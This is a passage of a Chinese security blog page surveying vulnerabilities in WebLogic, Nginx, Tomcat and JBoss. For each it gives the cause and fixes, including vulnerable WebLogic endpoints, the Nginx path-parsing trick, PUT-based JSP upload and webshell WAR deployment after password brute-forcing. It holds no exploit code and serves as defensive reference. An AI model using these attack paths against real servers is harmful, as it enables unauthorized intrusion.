+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.删除C:\Oracle\Middleware\wlserver_10.3\server\lib\wls-wsat.war </span><br><span class="line">2.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\.internal\wls-wsat.war </span><br><span class="line">3.删除C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat </span><br><span class="line">4.重启Weblogic</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="Weblogic-wls9-async-response-wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725"><a href="#Weblogic-wls9-async-response-wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725" class="headerlink" title="Weblogic wls9_async_response,wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725)"></a>Weblogic wls9_async_response,wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725)</h2><p>影响组件：bea_wls9_async_response.war, wls-wsat.war </p>
+<p>影响版本：10.3.6.0, 12.1.3.0 </p>
+<p>访问 &#x2F;_async&#x2F;AsyncResponseService 返回如下页面，则可能存在此漏洞。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328203645115.png" alt="image-20220328203645115"></p>
+<p>漏洞不仅存在于 &#x2F;_async&#x2F;AsyncResponseService 只要是在bea_wls9_async_response包中的Uri皆受到影响，可以查看web.xml得知所有受到影响的Uri，路径为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\WEB-INF\web.xml</span><br></pre></td></tr></table></figure>
+
+<p>默认受影响的Uri</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/_async/AsyncResponseService </span><br><span class="line">/_async/AsyncResponseServiceJms </span><br><span class="line">/_async/AsyncResponseServiceHttps</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP&#x2F;POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好</p>
+<h2 id="文件解析"><a href="#文件解析" class="headerlink" title="文件解析"></a>文件解析</h2><h3 id="漏洞介绍及成因"><a href="#漏洞介绍及成因" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h3><p>对任意文件名，在后面添加&#x2F;任意文件名.php的解析漏洞，比如原本文件名是test.jpg，可以添加test.jpg&#x2F;x.php进行解析攻击。</p>
+<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php&#x2F;1.jpg这样的目录时，只要1.jpg不存在就会显示404；</p>
+<p>2） 将&#x2F;etc&#x2F;php5&#x2F;fpm&#x2F;pool.d&#x2F;<a target="_blank" rel="noopener" href="http://www.conf/">www.conf</a>中security.limit_ectensions后面的值设为.php</p>
+<h2 id="目录遍历-1"><a href="#目录遍历-1" class="headerlink" title="目录遍历"></a>目录遍历</h2><h3 id="成因-1"><a href="#成因-1" class="headerlink" title="成因"></a>成因</h3><p>Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露</p>
+<h3 id="修复-1"><a href="#修复-1" class="headerlink" title="修复"></a>修复</h3><p>将&#x2F;etc&#x2F;nginx&#x2F;sites-avaliable&#x2F;default里的autoindex on改为autoindex off</p>
+<h2 id="CRLF注入"><a href="#CRLF注入" class="headerlink" title="CRLF注入"></a>CRLF注入</h2><h3 id="成因-2"><a href="#成因-2" class="headerlink" title="成因"></a>成因</h3><p>CRLF时“回车+换行”（\r\n）的简称。</p>
+<p>HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。</p>
+<p>通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。</p>
+<h3 id="修复-2"><a href="#修复-2" class="headerlink" title="修复"></a>修复</h3><p>Nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;error1.conf修改为使用不解码的url跳转。</p>
+<h2 id="目录穿越"><a href="#目录穿越" class="headerlink" title="目录穿越"></a>目录穿越</h2><h3 id="成因-3"><a href="#成因-3" class="headerlink" title="成因"></a>成因</h3><p>Nginx反向代理，静态文件存储在&#x2F;home&#x2F;下，而访问时需要在url中输入files，配置文件中&#x2F;files没有用&#x2F;闭合，导致可以穿越至上层目录。</p>
+<h3 id="修复-3"><a href="#修复-3" class="headerlink" title="修复"></a>修复</h3><p>Nginx的配置文件&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;error2.conf的&#x2F;files使用&#x2F;闭合。</p>
+<h1 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用  服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP  程序的首选。对于一个初学者来说，可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （  标准通用标记语言下的一个应用）页面的访问请求。实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat  时，它实际上作为一个与Apache 独立的进程单独运行的。</p>
+<h2 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h2><h3 id="成因-4"><a href="#成因-4" class="headerlink" title="成因"></a>成因</h3><p>Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。</p>
+<p>影响版本： Apache Tomcat 7.0.0 – 7.0.81</p>
+<h3 id="修复-4"><a href="#修复-4" class="headerlink" title="修复"></a>修复</h3><p>1）检测当前版本是否在影响范围内，并禁用PUT方法。</p>
+<p>2）更新并升级至最新版。</p>
+<h2 id="war后门文件部署-1"><a href="#war后门文件部署-1" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="成因-5"><a href="#成因-5" class="headerlink" title="成因"></a>成因</h3><p>Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。</p>
+<p>若后台管理页面存在弱口令，则可以通过爆破获取密码。</p>
+<h3 id="修复-5"><a href="#修复-5" class="headerlink" title="修复"></a>修复</h3><p>1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。</p>
+<p>2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME&#x2F;conf&#x2F;web.xml文件设置锁定机制和时间超时限制。</p>
+<p>3）以及针对manager-gui&#x2F;manager-status&#x2F;manager-script等目录页面设置最小权限访问限制。</p>
+<p>4）后台管理避免弱口令。</p>
+<h1 id="jBoss"><a href="#jBoss" class="headerlink" title="jBoss"></a>jBoss</h1><p>jBoss是一个基于J2EE的开发源代码的应用服务器。  JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB  2.0和EJB3的规范。但JBoss核心服务不包括支持servlet&#x2F;JSP的WEB容器，一般与Tomcat或Jetty绑定使用。</p>
+<h2 id="反序列化漏洞-1"><a href="#反序列化漏洞-1" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="成因-6"><a href="#成因-6" class="headerlink" title="成因"></a>成因</h3><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现</p>
+<h3 id="修复-6"><a href="#修复-6" class="headerlink" title="修复"></a>修复</h3><p>1）不需要http-invoker.sar 组件的用户可直接删除此组件；</p>
+<p>2）用于对 httpinvoker 组件进行访问控制</p>
+<h2 id="war后门文件部署-2"><a href="#war后门文件部署-2" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="成因-7"><a href="#成因-7" class="headerlink" title="成因"></a>成因</h3><p>jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>原创技术分享，您的支持将鼓励我继续创作</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Spring 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Spring 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+	  
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6/" rel="tag"># 中间件</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/28/HW%E8%93%9D%E9%98%9F%E9%9D%A2%E8%AF%95/" rel="prev" title="HW蓝队面试">
+      <i class="fa fa-chevron-left"></i> HW蓝队面试
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/04/01/Fastjson%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3/" rel="next" title="Fastjson漏洞详解">
+      Fastjson漏洞详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#IIS"><span class="nav-number">1.</span> <span class="nav-text">IIS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-6-x"><span class="nav-number">1.1.1.</span> <span class="nav-text">IIS 6.x</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%90%8D%E5%AD%97"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">基于文件名字</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E%E6%96%87%E4%BB%B6%E5%A4%B9"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">基于文件夹</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.1.1.3.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-x"><span class="nav-number">1.1.2.</span> <span class="nav-text">IIS 7.x</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PUT%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5"><span class="nav-number">1.2.</span> <span class="nav-text">PUT任意文件写入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-2"><span class="nav-number">1.2.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#IIS%E7%9F%AD%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.3.</span> <span class="nav-text">IIS短文件漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#HTTP-SYS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-MS15-034"><span class="nav-number">1.4.</span> <span class="nav-text">HTTP.SYS远程代码执行(MS15-034)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-3"><span class="nav-number">1.4.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RCE-CVE-2017-7269"><span class="nav-number">1.5.</span> <span class="nav-text">RCE-CVE-2017-7269</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-4"><span class="nav-number">1.5.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Apache"><span class="nav-number">2.</span> <span class="nav-text">Apache</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">2.1.</span> <span class="nav-text">解析漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9C%AA%E7%9F%A5%E6%89%A9%E5%B1%95%E5%90%8D%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.1.</span> <span class="nav-text">未知扩展名解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#AddHandler%E5%AF%BC%E8%87%B4%E7%9A%84%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-number">2.1.2.</span> <span class="nav-text">AddHandler导致的解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache-HTTPD%E6%8D%A2%E8%A1%8C%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-15715"><span class="nav-number">2.1.3.</span> <span class="nav-text">Apache HTTPD换行解析漏洞（CVE-2017-15715)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-5"><span class="nav-number">2.1.3.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"><span class="nav-number">2.2.</span> <span class="nav-text">目录遍历</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-number">2.2.1.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#WebLogic"><span class="nav-number">3.</span> <span class="nav-text">WebLogic</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-number">3.1.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">3.1.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">3.1.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SSRF"><span class="nav-number">3.2.</span> <span class="nav-text">SSRF</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">3.3.</span> <span class="nav-text">任意文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-1"><span class="nav-number">3.3.1.</span> <span class="nav-text">漏洞简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">3.3.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#war%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E9%83%A8%E7%BD%B2"><span class="nav-number">3.4.</span> <span class="nav-text">war后门文件部署</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0"><span class="nav-number">3.4.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D"><span class="nav-number">3.4.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271-amp-CVE-2017-3506"><span class="nav-number">3.5.</span> <span class="nav-text">XMLDecoder反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506)</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-6"><span class="nav-number">3.5.1.</span> <span class="nav-text">修复建议</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-wls9-async-response-wls-wsat%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-2725"><span class="nav-number">3.6.</span> <span class="nav-text">Weblogic wls9_async_response,wls-wsat反序列化远程代码执行漏洞（CVE-2019-2725)</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Nginx"><span class="nav-number">4.</span> <span class="nav-text">Nginx</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="nav-number">4.1.</span> <span class="nav-text">文件解析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D%E5%8F%8A%E6%88%90%E5%9B%A0"><span class="nav-number">4.1.1.</span> <span class="nav-text">漏洞介绍及成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">4.1.2.</span> <span class="nav-text">漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-1"><span class="nav-number">4.2.</span> <span class="nav-text">目录遍历</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-1"><span class="nav-number">4.2.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-1"><span class="nav-number">4.2.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CRLF%E6%B3%A8%E5%85%A5"><span class="nav-number">4.3.</span> <span class="nav-text">CRLF注入</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-2"><span class="nav-number">4.3.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-2"><span class="nav-number">4.3.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A"><span class="nav-number">4.4.</span> <span class="nav-text">目录穿越</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-3"><span class="nav-number">4.4.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-3"><span class="nav-number">4.4.2.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Tomcat"><span class="nav-number">5.</span> <span class="nav-text">Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">5.1.</span> <span class="nav-text">远程代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-4"><span class="nav-number">5.1.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-4"><span class="nav-number">5.1.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#war%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E9%83%A8%E7%BD%B2-1"><span class="nav-number">5.2.</span> <span class="nav-text">war后门文件部署</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-5"><span class="nav-number">5.2.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-5"><span class="nav-number">5.2.2.</span> <span class="nav-text">修复</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#jBoss"><span class="nav-number">6.</span> <span class="nav-text">jBoss</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">6.1.</span> <span class="nav-text">反序列化漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-6"><span class="nav-number">6.1.1.</span> <span class="nav-text">成因</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%AE%E5%A4%8D-6"><span class="nav-number">6.1.2.</span> <span class="nav-text">修复</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#war%E5%90%8E%E9%97%A8%E6%96%87%E4%BB%B6%E9%83%A8%E7%BD%B2-2"><span class="nav-number">6.2.</span> <span class="nav-text">war后门文件部署</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%90%E5%9B%A0-7"><span class="nav-number">6.2.1.</span> <span class="nav-text">成因</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Spring"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Spring</p>
+  <div class="site-description" itemprop="description">见到一座山，就想知道山后面是什么。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/yourname" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;yourname" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://blog.csdn.net/qq_49502930" title="CSDN → https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_49502930" rel="noopener" target="_blank"><i class="crosshairs fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Spring</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":"true#是否在手机端显示"},"log":false});</script></body>
+</html>
